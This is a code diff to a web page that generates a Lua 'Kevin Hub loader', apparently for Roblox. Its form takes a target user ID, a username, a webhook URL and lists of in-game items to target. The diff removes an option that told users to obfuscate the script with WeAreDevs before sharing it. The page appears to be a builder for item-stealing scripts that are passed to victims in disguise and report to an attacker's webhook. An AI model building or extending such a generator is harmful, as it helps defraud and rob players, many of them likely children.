@@ -765,14 +765,6 @@
             <input type="checkbox" id="shortLoadstring" checked>
             <span class="toggle"></span>
           </label>
-          <label class="checkbox-row" style="margin-top: 0.5rem;">
-            <div class="info">
-              <div class="name">Obfuscate Script</div>
-              <div class="desc">Adds a note to use WeAreDevs before sharing</div>
-            </div>
-            <input type="checkbox" id="obfuscateToggle">
-            <span class="toggle"></span>
-          </label>
         </div>
       </div>
 
@@ -792,7 +784,7 @@
         </div>
         <div class="output-box" id="scriptOutput">Fill in the form and press GENERATE SCRIPT to build your Kevin Hub loader.</div>
         <button class="generate-btn" id="generateBtn">Generate Script</button>
-        <p class="hint">discord.gg/luascript<span class="key">Pastefy</span></p>
+        <p class="hint">Real link generated on every click</p>
       </div>
     </div>
 
@@ -840,7 +832,6 @@
       const usernameInput = $('usernameInput');
       const webhookInput = $('webhookInput');
       const shortLoadstringCheck = $('shortLoadstring');
-      const obfuscateToggle = $('obfuscateToggle');
 
       function renderPills(container, items, selectedSet, type) {
         container.innerHTML = '';
@@ -1044,10 +1035,6 @@
           '        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)\n' +
           '    end\n' +
           'end)\n';
-
-        if (obfuscateToggle.checked) {
-          luaScript = '-- ⚠️ OBFUSCATION RECOMMENDED: Copy this script and paste it into https://wearedevs.net/obfuscator before sharing.\n' + luaScript;
-        }
 
         generateBtn.disabled = true;
         generateBtn.innerHTML = '<span class="spinner"></span>Uploading...';
